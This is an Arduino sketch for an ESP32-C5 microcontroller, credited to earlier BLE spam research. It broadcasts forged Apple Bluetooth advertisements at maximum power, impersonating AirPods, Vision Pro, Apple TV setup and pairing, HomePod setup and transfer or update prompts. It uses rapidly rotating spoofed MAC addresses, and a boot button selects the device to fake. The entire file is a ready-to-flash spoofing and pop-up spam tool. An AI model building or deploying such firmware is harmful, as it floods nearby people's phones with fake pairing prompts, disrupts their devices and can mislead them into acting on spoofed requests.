// This example takes heavy inspiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Preferences.h>

#include <esp_arduino_version.h>

#include "devices.hpp"
#include "led.hpp"

// Compatibility layer for ESP32 Arduino v3.x and newer RISC-V targets
#ifndef ADV_TYPE_IND
#define ADV_TYPE_IND 0x00
#define ADV_TYPE_DIRECT_IND_HIGH 0x01
#define ADV_TYPE_SCAN_IND 0x02
#define ADV_TYPE_NONCONN_IND 0x03
#endif

// Bluetooth maximum transmit power for ESP32-C5
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20  
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 100;

int currentMode = 0;
Preferences preferences;

// Remapped for ESP32-C5 (Boot button on GPIO 28)
const int BOOT_BUTTON_PIN = 28;
const unsigned long LONG_PRESS_TIME = 1000; // 1 second

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32-C5 BLE");

  // Open "storage" namespace (false = read/write)
  preferences.begin("my-app", false);
  currentMode = preferences.getInt("mode", 0);
  Serial.printf("Current Mode: %d\n", currentMode);
  preferences.end();

  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
  
  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to MAX
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void resetMode(){
  currentMode = 0;
  Serial.printf("Resetting mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void nextMode(){
  currentMode = (currentMode + 1) % (sizeof(stateTable) / sizeof(stateTable[0]));
  Serial.printf("Updating mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
  uint8_t packet[31];
  size_t packetLen;
  generatePacket(dev, packet, packetLen);
  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);

  // Use the native two-argument signature matching framework-arduinoespressif32 v3.3.12
  oAdvertisementData.addData((char*)packet, packetLen);
}

void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
  int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
  AppleDevice dev = ALL_DEVICES[idx];
  setAdvertisementData(oAdvertisementData, dev);
}

void loop() {
  // Check button press for mode switching and serial logging
  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    unsigned long startTime = millis();
    while(digitalRead(BOOT_BUTTON_PIN) == LOW); 

    unsigned long pressDuration = millis() - startTime;
    if (pressDuration > LONG_PRESS_TIME) {
      Serial.println("BOOT button long pressed!");
      resetMode();
    } else {
      Serial.println("BOOT button short pressed!");
      nextMode();
    }
  }

  // Generate fake random MAC matching original logic
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  switch (currentMode){
    case LEFT_OFF_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]); 
      break;
    case LEFT_OFF_RIGHT_FLASH:
      setRandomDeviceData(oAdvertisementData);
      break;
    case LEFT_OFF_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[SOFTWARE_UPDATE]); 
      break;
    case LEFT_FLASH_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_GEN_2]); 
      break;
    case LEFT_FLASH_RIGHT_FLASH:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[VISION_PRO]); 
      break;
    case LEFT_FLASH_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_MAX]); 
      break;
    case LEFT_ON_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_SETUP]); 
      break;
    case LEFT_ON_RIGHT_FLASH:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[TRANSFER_NUMBER]); 
      break;
    case LEFT_ON_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_PAIR]); 
      break;
    default:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[HOMEPOD_SETUP]); 
      break;
  }
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address and advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Start advertising
  pAdvertising->start();

  delay(delayMilliseconds); // Broadcast window duration
  
  // Stop advertising with a small buffer delay to prevent state collision
  pAdvertising->stop();
  delay(5);

  // Random signal strength variation
  int rand_val = random(100);  
  if (rand_val < 70) {  
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {  
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {  
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {  
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {  
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}
